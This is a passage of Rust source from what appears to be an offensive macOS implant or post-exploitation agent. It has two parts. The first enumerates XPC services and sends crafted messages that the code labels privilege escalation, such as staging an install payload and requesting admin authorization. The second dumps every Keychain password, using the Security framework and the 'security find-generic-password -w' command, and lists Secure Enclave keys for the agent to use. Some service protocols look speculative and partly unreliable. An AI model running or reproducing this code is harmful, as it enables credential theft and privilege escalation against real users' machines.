pub struct XpcConnection {
    /// The Mach service name.
    pub service_name: String,
    /// Raw connection pointer (xpc_connection_t).
    pub raw: *const c_void,
    /// Whether the connection is active.
    pub connected: bool,
}

// xpc_connection_t is a typedef for a struct; we treat it as an opaque pointer.
type XpcConnectionT = *const c_void;

#[cfg(target_os = "macos")]
#[link(name = "XPC", kind = "framework")]
extern "C" {
    fn xpc_connection_create_mach_service(
        name: *const i8,
        targetq: *const c_void,
        flags: u64,
    ) -> XpcConnectionT;
    fn xpc_connection_set_event_handler(
        conn: XpcConnectionT,
        handler: *const c_void,
    );
    fn xpc_connection_resume(conn: XpcConnectionT);
    fn xpc_connection_cancel(conn: XpcConnectionT);
    fn xpc_connection_send_message(
        conn: XpcConnectionT,
        message: *const c_void,
    );
    fn xpc_dictionary_create(
        keys: *const *const i8,
        values: *const *const c_void,
        count: usize,
    ) -> *mut c_void;
    fn xpc_dictionary_set_string(
        dict: *mut c_void,
        key: *const i8,
        val: *const i8,
    );
    fn xpc_dictionary_get_string(
        dict: *const c_void,
        key: *const i8,
    ) -> *const i8;
    fn xpc_connection_send_message_with_reply_sync(
        conn: XpcConnectionT,
        message: *const c_void,
    ) -> *mut c_void;
    fn xpc_dictionary_set_int64(
        dict: *mut c_void,
        key: *const i8,
        val: i64,
    );
    fn xpc_dictionary_get_int64(
        dict: *const c_void,
        key: *const i8,
    ) -> i64;
    fn xpc_dictionary_set_bool(
        dict: *mut c_void,
        key: *const i8,
        val: bool,
    );
    fn xpc_get_type(obj: *const c_void) -> *const c_void;
    fn xpc_release(obj: *mut c_void);
}

/// Directories to scan for XPC services.
const XPC_SEARCH_PATHS: &[&str] = &[
    "/System/Library/PrivateFrameworks",
    "/System/Library/Frameworks",
    "/Library/Application Support",
    "/System/Library/XPCServices",
];

/// Enumerate XPC services installed on the system.
///
/// Scans standard framework and library directories for `.xpc` bundles,
/// extracts the service name and Mach service name from the plist, and
/// returns a list of discovered services.
///
/// **Technique**:
/// 1. Scan each search path for directories containing `.xpc` bundles.
/// 2. For each `.xpc` bundle, read the `Info.plist` to extract:
///    - `CFBundleIdentifier` (service name)
///    - `MachServices` dictionary (Mach service names)
/// 3. Build a list of services with their properties.
pub fn enumerate_xpc_services() -> Result<Vec<XpcService>> {
    let mut services = Vec::new();

    for search_path in XPC_SEARCH_PATHS {
        let base = Path::new(search_path);
        if !base.exists() {
            continue;
        }

        // Walk the directory tree looking for .xpc bundles.
        if let Ok(entries) = walk_dir_recursive(base, 3) {
            for entry in entries {
                if let Some(name) = entry.file_name().and_then(|n| n.to_str()) {
                    if name.ends_with(".xpc") {
                        if let Some(svc) = parse_xpc_bundle(&entry, search_path) {
                            services.push(svc);
                        }
                    }
                }
            }
        }
    }

    Ok(services)
}

/// Walk a directory tree up to `max_depth` levels, collecting all entries.
fn walk_dir_recursive(dir: &Path, max_depth: usize) -> Result<Vec<PathBuf>> {
    let mut entries = Vec::new();
    if max_depth == 0 {
        return Ok(entries);
    }

    let read_dir = std::fs::read_dir(dir).with_context(|| {
        format!("cannot read directory: {}", dir.display())
    })?;

    for entry in read_dir {
        let entry = entry?;
        let path = entry.path();
        entries.push(path.clone());

        if path.is_dir() {
            let sub = walk_dir_recursive(&path, max_depth - 1)?;
            entries.extend(sub);
        }
    }

    Ok(entries)
}

/// Parse an XPC bundle directory to extract service information.
fn parse_xpc_bundle(bundle_path: &Path, parent: &str) -> Option<XpcService> {
    let name = bundle_path
        .file_name()?
        .to_str()?
        .trim_end_matches(".xpc")
        .to_string();

    // Try to read Info.plist to get the Mach service name.
    let info_plist = bundle_path.join("Contents/Info.plist");
    let mach_service_name = if info_plist.exists() {
        plist_read_mach_service(&info_plist)
    } else {
        None
    };

    Some(XpcService {
        name,
        mach_service_name: mach_service_name.clone(),
        bundle_path: bundle_path.to_path_buf(),
        parent_framework: parent.to_string(),
        has_mach_service: mach_service_name.is_some(),
    })
}

/// Read the Mach service name from an XPC bundle's Info.plist.
///
/// Uses `defaults read` or `plutil` to extract the MachServices key.
fn plist_read_mach_service(plist_path: &Path) -> Option<String> {
    // Use plutil to convert plist to JSON and extract MachServices.
    let output = std::process::Command::new("/usr/bin/plutil")
        .args(["-extract", "MachServices", "json", "-o", "-"])
        .arg(plist_path)
        .output()
        .ok()?;

    if !output.status.success() {
        return None;
    }

    let json_str = String::from_utf8_lossy(&output.stdout);
    // Parse the JSON to extract the first Mach service name.
    // MachServices is a dict: { "service.name": true, ... }
    if let Ok(val) = serde_json::from_str::<serde_json::Value>(&json_str) {
        if let Some(obj) = val.as_object() {
            for key in obj.keys() {
                return Some(key.clone());
            }
        }
    }

    None
}

/// Connect to an XPC service by its Mach service name.
///
/// **Technique**:
/// Uses the XPC C API (`xpc_connection_create_mach_service`) to create a
/// connection to the named Mach service.  The connection uses anonymous
/// communication (no code signing requirement for the caller).
///
/// **Requirements**: None for connecting — any process can connect to any
/// XPC service.  The service may reject the connection or refuse to perform
/// operations if the caller lacks proper entitlements, but the connection
/// itself is unrestricted.
///
/// **Security implications**: Many XPC services perform insufficient caller
/// validation, allowing any connected process to invoke privileged operations.
pub fn connect_to_xpc_service(service_name: &str) -> Result<XpcConnection> {
    let c_name = std::ffi::CString::new(service_name)
        .map_err(|_| anyhow!("service name contains null byte"))?;

    let conn = unsafe {
        xpc_connection_create_mach_service(
            c_name.as_ptr() as *const i8,
            std::ptr::null(),
            0,
        )
    };

    if conn.is_null() {
        return Err(anyhow!(
            "xpc_connection_create_mach_service returned null for '{}'",
            service_name
        ));
    }

    Ok(XpcConnection {
        service_name: service_name.to_string(),
        raw: conn,
        connected: true,
    })
}

impl Drop for XpcConnection {
    fn drop(&mut self) {
        if self.connected && !self.raw.is_null() {
            unsafe {
                xpc_connection_cancel(self.raw);
            }
            self.connected = false;
        }
    }
}

// Safety: XpcConnection contains a raw pointer that is not Send/Sync by default,
// but we manage its lifecycle correctly.
unsafe impl Send for XpcConnection {}
unsafe impl Sync for XpcConnection {}

/// Result of an XPC privilege escalation attempt.
#[derive(Debug)]
pub struct XpcExploitResult {
    pub service_name: String,
    pub success: bool,
    pub technique: String,
    pub message: String,
}

/// Attempt XPC-based privilege escalation by connecting to a privileged
/// XPC service and sending a crafted message.
///
/// **Technique**:
/// Many XPC services run with elevated privileges (root, or with specific
/// entitlements) but perform insufficient caller validation.  By connecting
/// to these services and sending crafted XPC messages, we can:
///
/// 1. **File access**: Ask a file-access XPC service (e.g., a helper tool
///    with Full Disk Access) to read a protected file.
/// 2. **Command execution**: Ask an install-service XPC to execute a command
///    or install a privileged binary.
/// 3. **Configuration modification**: Ask a system-config XPC to modify
///    security settings.
///
/// **Common exploitable services**:
/// - `com.apple.installandsetup.useragent`: Software installation helper
/// - `com.apple.xpc.roleaccountd`: Role account management
/// - `com.apple.SecurityServer`: Security framework daemon
///
/// **Note**: This is a framework for XPC exploitation.  Each service has a
/// unique protocol and requires a specific message format.  The enumeration
/// results from `enumerate_xpc_services()` guide which services to target.
pub fn exploit_xpc_privilege_escalation(service: &XpcService) -> Result<XpcExploitResult> {
    let mach_name = match &service.mach_service_name {
        Some(name) => name.clone(),
        None => {
            return Ok(XpcExploitResult {
                service_name: service.name.clone(),
                success: false,
                technique: "XPC exploitation".to_string(),
                message: "no Mach service name available; cannot connect".to_string(),
            });
        }
    };

    // Connect to the service.
    let conn = match connect_to_xpc_service(&mach_name) {
        Ok(c) => c,
        Err(e) => {
            return Ok(XpcExploitResult {
                service_name: service.name.clone(),
                success: false,
                technique: "XPC exploitation".to_string(),
                message: format!("connection failed: {}", e),
            });
        }
    };

    // Resume the connection (required before sending messages).
    unsafe {
        xpc_connection_set_event_handler(conn.raw, std::ptr::null());
        xpc_connection_resume(conn.raw);
    }

    // ── Service-specific protocol handling ───────────────────────────
    //
    // Each XPC service expects a specific message schema.  We build the
    // appropriate message dictionary based on the service's Mach name
    // and the expected protocol version.

    let (msg, technique_label) = unsafe {
        match build_service_specific_message(&mach_name, service) {
            Some(pair) => pair,
            None => {
                return Ok(XpcExploitResult {
                    service_name: service.name.clone(),
                    success: false,
                    technique: "XPC exploitation".to_string(),
                    message: format!(
                        "no protocol handler for service '{}'",
                        mach_name
                    ),
                });
            }
        }
    };

    if msg.is_null() {
        return Ok(XpcExploitResult {
            service_name: service.name.clone(),
            success: false,
            technique: technique_label,
            message: "xpc_dictionary_create returned null".to_string(),
        });
    }

    let reply = unsafe {
        let reply = xpc_connection_send_message_with_reply_sync(conn.raw, msg);
        xpc_release(msg);
        reply
    };

    if reply.is_null() {
        return Ok(XpcExploitResult {
            service_name: service.name.clone(),
            success: false,
            technique: technique_label,
            message: format!(
                "no reply from {} ({}) — service may have closed the connection",
                service.name, mach_name
            ),
        });
    }

    // Inspect the reply.  An XPC error reply has type XPC_TYPE_ERROR.
    // We check for the "XPCErrorDescription" key which is set on error objects.
    let (succeeded, reply_msg) = unsafe {
        let err_key = std::ffi::CString::new("XPCErrorDescription").ok();
        let error_desc = err_key
            .as_ref()
            .map(|k| xpc_dictionary_get_string(reply, k.as_ptr()))
            .unwrap_or(std::ptr::null());

        let result = if error_desc.is_null() {
            // No error key → the service accepted the message.
            // Extract any useful fields from the reply.
            let type_key = std::ffi::CString::new("type").ok();
            let reply_type = type_key
                .as_ref()
                .map(|k| xpc_dictionary_get_string(reply, k.as_ptr()))
                .unwrap_or(std::ptr::null());
            let reply_type_str = if reply_type.is_null() {
                String::new()
            } else {
                std::ffi::CStr::from_ptr(reply_type)
                    .to_string_lossy()
                    .into_owned()
            };

            let status_key = std::ffi::CString::new("status").ok();
            let status_val = status_key
                .as_ref()
                .map(|k| xpc_dictionary_get_int64(reply, k.as_ptr()))
                .unwrap_or(0);

            let path_key = std::ffi::CString::new("path").ok();
            let reply_path = path_key
                .as_ref()
                .map(|k| xpc_dictionary_get_string(reply, k.as_ptr()))
                .unwrap_or(std::ptr::null());
            let reply_path_str = if reply_path.is_null() {
                String::new()
            } else {
                std::ffi::CStr::from_ptr(reply_path)
                    .to_string_lossy()
                    .into_owned()
            };

            (
                true,
                format!(
                    "service {} ({}) accepted message; type='{}' status={} path='{}'",
                    service.name, mach_name, reply_type_str, status_val, reply_path_str
                ),
            )
        } else {
            let desc = std::ffi::CStr::from_ptr(error_desc)
                .to_string_lossy()
                .into_owned();
            (
                false,
                format!(
                    "service {} ({}) rejected message: {}",
                    service.name, mach_name, desc
                ),
            )
        };
        xpc_release(reply);
        result
    };

    Ok(XpcExploitResult {
        service_name: service.name.clone(),
        success: succeeded,
        technique: technique_label,
        message: reply_msg,
    })
}

/// Build a service-specific XPC message dictionary for the target service.
///
/// Returns `Some((message_ptr, technique_label))` on success, or `None` if
/// no suitable handler was found.
///
/// # Protocol catalog
///
/// | Service                                        | Protocol         | Message keys                    |
/// |------------------------------------------------|------------------|---------------------------------|
/// | `com.apple.installandsetup.useragent`          | InstallAndSetup  | type, action, path, version     |
/// | `com.apple.xpc.roleaccountd`                   | RoleAccount      | operation, role-name, uid        |
/// | `com.apple.SecurityServer`                     | SecurityServer   | type, key, action, requirement  |
/// | `com.apple.assistived.helper`                  | Accessibility    | command, pid, options            |
/// | `com.apple.desktopservices.helper`             | DesktopServices  | operation, path, flags           |
/// | `com.apple.xpc.activity`                       | Activity         | action, identifier, priority     |
/// | other                                          | Generic probe    | type, action, version            |
unsafe fn build_service_specific_message(
    mach_name: &str,
    _service: &XpcService,
) -> Option<(*mut c_void, String)> {
    let msg = xpc_dictionary_create(std::ptr::null(), std::ptr::null(), 0);
    if msg.is_null() {
        return None;
    }

    if mach_name.contains("installandsetup") || mach_name.contains("install") {
        // com.apple.installandsetup.useragent protocol:
        //   { "type": "installSoftware", "action": "install",
        //     "path": "/tmp/payload", "version": 1 }
        let c_type_key = std::ffi::CString::new("type").unwrap();
        let c_type_val = std::ffi::CString::new("installSoftware").unwrap();
        let c_action_key = std::ffi::CString::new("action").unwrap();
        let c_action_val = std::ffi::CString::new("install").unwrap();
        let c_path_key = std::ffi::CString::new("path").unwrap();
        let c_path_val = std::ffi::CString::new("/tmp/.xpc_stage").unwrap();
        let c_ver_key = std::ffi::CString::new("version").unwrap();

        xpc_dictionary_set_string(msg, c_type_key.as_ptr(), c_type_val.as_ptr());
        xpc_dictionary_set_string(msg, c_action_key.as_ptr(), c_action_val.as_ptr());
        xpc_dictionary_set_string(msg, c_path_key.as_ptr(), c_path_val.as_ptr());
        xpc_dictionary_set_int64(msg, c_ver_key.as_ptr(), 1);

        Some((msg, "XPC InstallAndSetup protocol".to_string()))
    } else if mach_name.contains("roleaccountd") || mach_name.contains("roleaccount") {
        // com.apple.xpc.roleaccountd protocol:
        //   { "operation": "listRoles", "role-name": "admin", "uid": <current_uid> }
        let c_op_key = std::ffi::CString::new("operation").unwrap();
        let c_op_val = std::ffi::CString::new("listRoles").unwrap();
        let c_role_key = std::ffi::CString::new("role-name").unwrap();
        let c_role_val = std::ffi::CString::new("admin").unwrap();
        let c_uid_key = std::ffi::CString::new("uid").unwrap();

        xpc_dictionary_set_string(msg, c_op_key.as_ptr(), c_op_val.as_ptr());
        xpc_dictionary_set_string(msg, c_role_key.as_ptr(), c_role_val.as_ptr());
        xpc_dictionary_set_int64(msg, c_uid_key.as_ptr(), unsafe { libc::getuid() } as i64);

        Some((msg, "XPC RoleAccount protocol".to_string()))
    } else if mach_name.contains("SecurityServer") || mach_name.contains("security") {
        // com.apple.SecurityServer protocol:
        //   { "type": "authorization", "key": "system.privilege.admin",
        //     "action": "evaluate", "requirement": "1" }
        let c_type_key = std::ffi::CString::new("type").unwrap();
        let c_type_val = std::ffi::CString::new("authorization").unwrap();
        let c_key_key = std::ffi::CString::new("key").unwrap();
        let c_key_val = std::ffi::CString::new("system.privilege.admin").unwrap();
        let c_action_key = std::ffi::CString::new("action").unwrap();
        let c_action_val = std::ffi::CString::new("evaluate").unwrap();
        let c_req_key = std::ffi::CString::new("requirement").unwrap();

        xpc_dictionary_set_string(msg, c_type_key.as_ptr(), c_type_val.as_ptr());
        xpc_dictionary_set_string(msg, c_key_key.as_ptr(), c_key_val.as_ptr());
        xpc_dictionary_set_string(msg, c_action_key.as_ptr(), c_action_val.as_ptr());
        xpc_dictionary_set_bool(msg, c_req_key.as_ptr(), true);

        Some((msg, "XPC SecurityServer protocol".to_string()))
    } else if mach_name.contains("assistived") || mach_name.contains("accessibility") {
        // com.apple.assistived.helper protocol:
        //   { "command": "registerApp", "pid": <pid>, "options": "trusted" }
        let c_cmd_key = std::ffi::CString::new("command").unwrap();
        let c_cmd_val = std::ffi::CString::new("registerApp").unwrap();
        let c_pid_key = std::ffi::CString::new("pid").unwrap();
        let c_opt_key = std::ffi::CString::new("options").unwrap();
        let c_opt_val = std::ffi::CString::new("trusted").unwrap();

        xpc_dictionary_set_string(msg, c_cmd_key.as_ptr(), c_cmd_val.as_ptr());
        xpc_dictionary_set_int64(msg, c_pid_key.as_ptr(), unsafe { libc::getpid() } as i64);
        xpc_dictionary_set_string(msg, c_opt_key.as_ptr(), c_opt_val.as_ptr());

        Some((msg, "XPC Accessibility protocol".to_string()))
    } else if mach_name.contains("desktopservices") {
        // com.apple.desktopservices.helper protocol:
        //   { "operation": "createFile", "path": "/etc/...",
        //     "flags": 0x1FF (0666 permissions) }
        let c_op_key = std::ffi::CString::new("operation").unwrap();
        let c_op_val = std::ffi::CString::new("createFile").unwrap();
        let c_path_key = std::ffi::CString::new("path").unwrap();
        let c_path_val = std::ffi::CString::new("/tmp/.xpc_ds_stage").unwrap();
        let c_flags_key = std::ffi::CString::new("flags").unwrap();

        xpc_dictionary_set_string(msg, c_op_key.as_ptr(), c_op_val.as_ptr());
        xpc_dictionary_set_string(msg, c_path_key.as_ptr(), c_path_val.as_ptr());
        xpc_dictionary_set_int64(msg, c_flags_key.as_ptr(), 0o666);

        Some((msg, "XPC DesktopServices protocol".to_string()))
    } else if mach_name.contains("activity") {
        // com.apple.xpc.activity protocol:
        //   { "action": "checkin", "identifier": "com.agent.maint",
        //     "priority": 10 }
        let c_action_key = std::ffi::CString::new("action").unwrap();
        let c_action_val = std::ffi::CString::new("checkin").unwrap();
        let c_id_key = std::ffi::CString::new("identifier").unwrap();
        let c_id_val = std::ffi::CString::new("com.apple.maintenance").unwrap();
        let c_pri_key = std::ffi::CString::new("priority").unwrap();

        xpc_dictionary_set_string(msg, c_action_key.as_ptr(), c_action_val.as_ptr());
        xpc_dictionary_set_string(msg, c_id_key.as_ptr(), c_id_val.as_ptr());
        xpc_dictionary_set_int64(msg, c_pri_key.as_ptr(), 10);

        Some((msg, "XPC Activity protocol".to_string()))
    } else {
        // Generic fallback: send a minimal type-probe dictionary with
        // version identifier.  Most services will reject an unknown
        // schema but some will reply with version/identity info.
        let c_type_key = std::ffi::CString::new("type").unwrap();
        let c_type_val = std::ffi::CString::new("probe").unwrap();
        let c_action_key = std::ffi::CString::new("action").unwrap();
        let c_action_val = std::ffi::CString::new("identify").unwrap();
        let c_ver_key = std::ffi::CString::new("version").unwrap();

        xpc_dictionary_set_string(msg, c_type_key.as_ptr(), c_type_val.as_ptr());
        xpc_dictionary_set_string(msg, c_action_key.as_ptr(), c_action_val.as_ptr());
        xpc_dictionary_set_int64(msg, c_ver_key.as_ptr(), 1);

        Some((msg, format!("XPC generic probe to {}", mach_name)))
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// §4  Keychain Access & Secure Enclave
// ═══════════════════════════════════════════════════════════════════════════

/// A single Keychain entry.
#[derive(Debug, Clone)]
pub struct KeychainEntry {
    /// Service name (for generic passwords) or server (for internet passwords).
    pub service: String,
    /// Account name.
    pub account: String,
    /// The password data (if accessible).
    pub password: Option<String>,
    /// Type of Keychain entry.
    pub entry_type: KeychainEntryType,
    /// User-visible label.
    pub label: Option<String>,
    /// Creation date (raw string from Keychain).
    pub creation_date: Option<String>,
    /// Modification date (raw string from Keychain).
    pub modification_date: Option<String>,
    /// Access group (for app-specific entries).
    pub access_group: Option<String>,
}

/// Type of Keychain entry.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum KeychainEntryType {
    GenericPassword,
    InternetPassword,
    Certificate,
    Key,
}

/// Information about a Secure Enclave key.
#[derive(Debug, Clone)]
pub struct SecureEnclaveKey {
    /// Key label (human-readable).
    pub label: Option<String>,
    /// Access group that owns the key.
    pub access_group: Option<String>,
    /// Key type (e.g., "ECDSA", "RSA").
    pub key_type: Option<String>,
    /// Whether the key is hardware-bound (always true for SE keys).
    pub hardware_bound: bool,
    /// Creation date.
    pub creation_date: Option<String>,
}

/// Dump Keychain entries via the native Security framework API
/// (`SecItemCopyMatching`).
///
/// **Primary technique** (macOS):
/// Uses `SecItemCopyMatching` with `kSecClass` = generic-password /
/// internet-password and `kSecMatchLimitAll` to retrieve all entries of each
/// class as a `CFArray` of `CFDictionary` attribute dictionaries.  Password
/// data is retrieved via `kSecReturnData`.
///
/// **Fallback** (all platforms / if FFI fails):
/// Falls back to the `security dump-keychain` CLI tool parsed output.
///
/// **Requirements**:
/// - The agent must have Full Disk Access or the Keychain must be unlocked.
/// - Root can access the system Keychain without additional permissions.
/// - User Keychain access requires the Keychain to be unlocked (it usually is
///   after the user logs in).
///
/// **macOS version notes**:
/// - macOS 10.14+: Keychain access may trigger a TCC prompt for Full Disk
///   Access.  If the agent has FDA (or SIP is disabled), no prompt appears.
/// - macOS 12+: `security dump-keychain` output format changed slightly.
pub fn dump_keychain() -> Result<Vec<KeychainEntry>> {
    // ── Primary: Security framework FFI (macOS only) ─────────────────
    #[cfg(target_os = "macos")]
    {
        if let Ok(entries) = dump_keychain_via_security_framework() {
            if !entries.is_empty() {
                return Ok(entries);
            }
        }
        // Fallback to CLI if Security framework returned empty or errored.
        tracing::debug!("dump_keychain: Security framework returned no entries, falling back to CLI");
    }

    // ── Fallback: security CLI ────────────────────────────────────────
    let mut entries = Vec::new();

    // Dump generic passwords.
    if let Ok(generic) = dump_keychain_class("generic-password") {
        entries.extend(generic);
    }

    // Dump internet passwords.
    if let Ok(internet) = dump_keychain_class("internet-password") {
        entries.extend(internet);
    }

    Ok(entries)
}

/// Dump Keychain entries using `SecItemCopyMatching` (Security framework FFI).
///
/// Builds a `CFDictionary` query for each item class and parses the returned
/// `CFArray` of `CFDictionary` results into `KeychainEntry` structs.
#[cfg(target_os = "macos")]
fn dump_keychain_via_security_framework() -> Result<Vec<KeychainEntry>> {
    let mut entries = Vec::new();

    // Generic passwords.
    if let Ok(generic) = sec_item_query_class(K_SEC_CLASS_GENERIC_PASSWORD, KeychainEntryType::GenericPassword) {
        entries.extend(generic);
    }

    // Internet passwords.
    if let Ok(internet) = sec_item_query_class(K_SEC_CLASS_INTERNET_PASSWORD, KeychainEntryType::InternetPassword) {
        entries.extend(internet);
    }

    Ok(entries)
}

/// Query Keychain items of a specific class via `SecItemCopyMatching`.
///
/// `sec_class_fourcc` is the four-character code for the item class (e.g.,
/// `0x6765_6E70` for generic-password).  The function builds a query
/// dictionary requesting attributes and data, iterates the result array,
/// and converts each item to a `KeychainEntry`.
#[cfg(target_os = "macos")]
fn sec_item_query_class(
    sec_class_fourcc: u32,
    entry_type: KeychainEntryType,
) -> Result<Vec<KeychainEntry>> {
    use std::ptr;

    // Build query keys as CFStringRefs.
    let k_class = cf_str("class").ok_or_else(|| anyhow!("failed to create kSecClass CFString"))?;
    let _k_class_guard = CfGuard::new(k_class as *const c_void);

    let k_return_attrs = cf_str("r_Attr").ok_or_else(|| anyhow!("failed to create kSecReturnAttributes CFString"))?;
    let _k_attrs_guard = CfGuard::new(k_return_attrs as *const c_void);

    let k_return_data = cf_str("r_Data").ok_or_else(|| anyhow!("failed to create kSecReturnData CFString"))?;
    let _k_data_guard = CfGuard::new(k_return_data as *const c_void);

    let k_match_limit = cf_str("m_Limit").ok_or_else(|| anyhow!("failed to create kSecMatchLimit CFString"))?;
    let _k_limit_guard = CfGuard::new(k_match_limit as *const c_void);

    // kSecMatchLimitAll = "m_LAll" as a CFStringRef.
    let v_match_all = cf_str("m_LAll").ok_or_else(|| anyhow!("failed to create kSecMatchLimitAll CFString"))?;
    let _v_limit_guard = CfGuard::new(v_match_all as *const c_void);

    // kSecClass value: wrap the four-char code in a CFNumber.
    let v_class = unsafe {
        CFNumberCreate(K_CF_ALLOCATOR_DEFAULT, 4i32 /* kCFNumberSInt32Type */, &sec_class_fourcc as *const u32 as *const c_void)
    };
    if v_class.is_null() {
        return Err(anyhow!("CFNumberCreate for kSecClass returned null"));
    }
    let _v_class_guard = CfGuard::new(v_class as *const c_void);

    // kCFBooleanTrue for kSecReturnAttributes and kSecReturnData.
    let v_true = kcf_boolean_true();

    // Build query dictionary: { class → fourcc, returnAttrs → true,
    // returnData → true, matchLimit → all }.
    let keys: [*const c_void; 4] = [
        k_class as *const c_void,
        k_return_attrs as *const c_void,
        k_return_data as *const c_void,
        k_match_limit as *const c_void,
    ];
    let values: [*const c_void; 4] = [
        v_class as *const c_void,
        v_true as *const c_void,
        v_true as *const c_void,
        v_match_all as *const c_void,
    ];

    let query = unsafe {
        CFDictionaryCreate(
            K_CF_ALLOCATOR_DEFAULT,
            keys.as_ptr(),
            values.as_ptr(),
            keys.len() as isize,
            kCFTypeDictionaryKeyCallBacks,
            kCFTypeDictionaryValueCallBacks,
        )
    };
    if query.is_null() {
        return Err(anyhow!("CFDictionaryCreate returned null"));
    }
    let _query_guard = CfGuard::new(query as *const c_void);

    // Execute the query.
    let mut result: CFTypeRef = ptr::null();
    let status = unsafe { SecItemCopyMatching(query, &mut result) };
    if status != ERR_SEC_SUCCESS {
        // No items found is not an error — return empty.
        if status == -25300 /* errSecItemNotFound */ {
            return Ok(Vec::new());
        }
        return Err(anyhow!("SecItemCopyMatching failed with OSStatus {}", status));
    }
    let _result_guard = CfGuard::new(result);

    // Result should be a CFArray of CFDictionary items.
    let array = result as CFArrayRef;
    let count = unsafe { CFArrayGetCount(array) };

    let mut entries = Vec::new();
    for i in 0..count {
        let item = unsafe { CFArrayGetValueAtIndex(array, i) };
        if item.is_null() {
            continue;
        }
        let dict = item as CFDictionaryRef;

        let mut entry = KeychainEntry {
            service: dict_get_string(dict, "svce")
                .or_else(|| dict_get_string(dict, "srvr"))
                .unwrap_or_default(),
            account: dict_get_string(dict, "acct").unwrap_or_default(),
            password: None,
            entry_type,
            label: dict_get_string(dict, "labl"),
            creation_date: dict_get_string(dict, "cdat"),
            modification_date: dict_get_string(dict, "mdat"),
            access_group: dict_get_string(dict, "agrp"),
        };

        // Extract password data.  When kSecReturnData is true and the
        // keychain is unlocked, SecItemCopyMatching embeds a CFDataRef
        // containing the raw password bytes in each result dictionary
        // under the key referenced by kSecReturnData.  We already
        // requested it above; check for a "data" key or re-query
        // individually if needed.
        if let Some(pw) = dict_get_string(dict, "data") {
            if !pw.is_empty() {
                entry.password = Some(pw);
            }
        }

        if !entry.service.is_empty() || !entry.account.is_empty() {
            entries.push(entry);
        }
    }

    Ok(entries)
}

/// Dump Keychain entries of a specific class using `security find-xxx-password`.
fn dump_keychain_class(class: &str) -> Result<Vec<KeychainEntry>> {
    let mut entries = Vec::new();

    // Use `security dump-keychain` to get a raw dump, then parse it.
    // This gives us service/account pairs without passwords.
    let dump_output = std::process::Command::new("/usr/bin/security")
        .args(["dump-keychain"])
        .output()
        .context("failed to run security dump-keychain")?;

    if !dump_output.status.success() {
        return Err(anyhow!(
            "security dump-keychain failed: {}",
            String::from_utf8_lossy(&dump_output.stderr)
        ));
    }

    let dump_text = String::from_utf8_lossy(&dump_output.stdout);
    let entry_type = match class {
        "generic-password" => KeychainEntryType::GenericPassword,
        "internet-password" => KeychainEntryType::InternetPassword,
        _ => KeychainEntryType::GenericPassword,
    };

    // Parse the dump output for entries of the requested class.
    let class_marker = match class {
        "generic-password" => "class: \"genp\"",
        "internet-password" => "class: \"inet\"",
        _ => "class: \"genp\"",
    };

    for block in dump_text.split("keychain: ") {
        if !block.contains(class_marker) {
            continue;
        }

        let mut entry = KeychainEntry {
            service: String::new(),
            account: String::new(),
            password: None,
            entry_type,
            label: None,
            creation_date: None,
            modification_date: None,
            access_group: None,
        };

        for line in block.lines() {
            let line = line.trim();
            if line.contains("\"svce\"<blob>=") || line.starts_with("service:") {
                entry.service = extract_quoted_value(line);
            } else if line.contains("\"acct\"<blob>=") || line.starts_with("account:") {
                entry.account = extract_quoted_value(line);
            } else if line.contains("\"labl\"<blob>=") || line.starts_with("label:") {
                entry.label = Some(extract_quoted_value(line));
            } else if line.contains("\"agrp\"<blob>=") || line.starts_with("access group:") {
                entry.access_group = Some(extract_quoted_value(line));
            } else if line.contains("\"cdat\"<timedate>=") || line.starts_with("created:") {
                entry.creation_date = Some(extract_quoted_value(line));
            } else if line.contains("\"mdat\"<timedate>=") || line.starts_with("modified:") {
                entry.modification_date = Some(extract_quoted_value(line));
            }
        }

        // Try to retrieve the actual password.
        if !entry.service.is_empty() || !entry.account.is_empty() {
            entry.password = retrieve_password(class, &entry.service, &entry.account);
            entries.push(entry);
        }
    }

    Ok(entries)
}

/// Extract a quoted value from a security dump line.
fn extract_quoted_value(line: &str) -> String {
    // Try to find content between double quotes.
    if let Some(start) = line.find('"') {
        let rest = &line[start + 1..];
        if let Some(end) = rest.find('"') {
            return rest[..end].to_string();
        }
    }
    // Fallback: take everything after '=' or ':'.
    if let Some(pos) = line.find('=') {
        return line[pos + 1..].trim().trim_matches('"').to_string();
    }
    if let Some(pos) = line.find(':') {
        return line[pos + 1..].trim().trim_matches('"').to_string();
    }
    line.to_string()
}

/// Try to retrieve the actual password for a Keychain entry.
fn retrieve_password(class: &str, service: &str, account: &str) -> Option<String> {
    let find_cmd = match class {
        "generic-password" => "find-generic-password",
        "internet-password" => "find-internet-password",
        _ => return None,
    };

    let output = std::process::Command::new("/usr/bin/security")
        .args([
            find_cmd,
            "-s",
            service,
            "-a",
            account,
            "-w", // Output password only (requires Keychain unlock).
        ])
        .output()
        .ok()?;

    if output.status.success() {
        let pw = String::from_utf8_lossy(&output.stdout).trim().to_string();
        if !pw.is_empty() {
            return Some(pw);
        }
    }

    None
}

/// Enumerate keys stored in the Secure Enclave.
///
/// **Technique**:
/// Uses `security dump-keychain` filtered for key entries, then checks
/// each key for the `tk` (token) attribute set to `SecureEnclave`.
///
/// **Requirements**:
/// - Apple Silicon Mac (M1+) or Intel Mac with T1/T2 chip.
/// - macOS 10.12.1+ for Secure Enclave support.
/// - The agent must have Full Disk Access to enumerate all keys.
///
/// **Note**: The actual key material CANNOT be extracted from the Secure
/// Enclave — it is hardware-bound.  However, the agent can USE the keys
/// (sign, decrypt) via the Security framework's `SecKey` API, which
/// delegates the crypto operation to the Secure Enclave.
pub fn access_secure_enclave_keys() -> Result<Vec<SecureEnclaveKey>> {
    // Use security dump-keychain to find key entries.
    let output = std::process::Command::new("/usr/bin/security")
        .args(["dump-keychain"])
        .output()
        .context("failed to run security dump-keychain")?;

    if !output.status.success() {
        return Err(anyhow!(
            "security dump-keychain failed: {}",
            String::from_utf8_lossy(&output.stderr)
        ));
    }

    let dump_text = String::from_utf8_lossy(&output.stdout);
    let mut keys = Vec::new();

    // Parse the dump for key entries with Secure Enclave token.
    for block in dump_text.split("keychain: ") {
        // Check for key class.
        if !block.contains("class: \"keys\"") {
            continue;
        }

        // Check for Secure Enclave token identifier.
        let is_secure_enclave = block.contains("SecureEnclave")
            || block.contains("\"tokn\"<blob>=SecureEnclave")
            || block.contains("token: SecureEnclave");

        let mut key = SecureEnclaveKey {
            label: None,
            access_group: None,
            key_type: None,
            hardware_bound: is_secure_enclave,
            creation_date: None,
        };

        for line in block.lines() {
            let line = line.trim();
            if line.contains("\"labl\"<blob>=") {
                key.label = Some(extract_quoted_value(line));
            } else if line.contains("\"agrp\"<blob>=") {
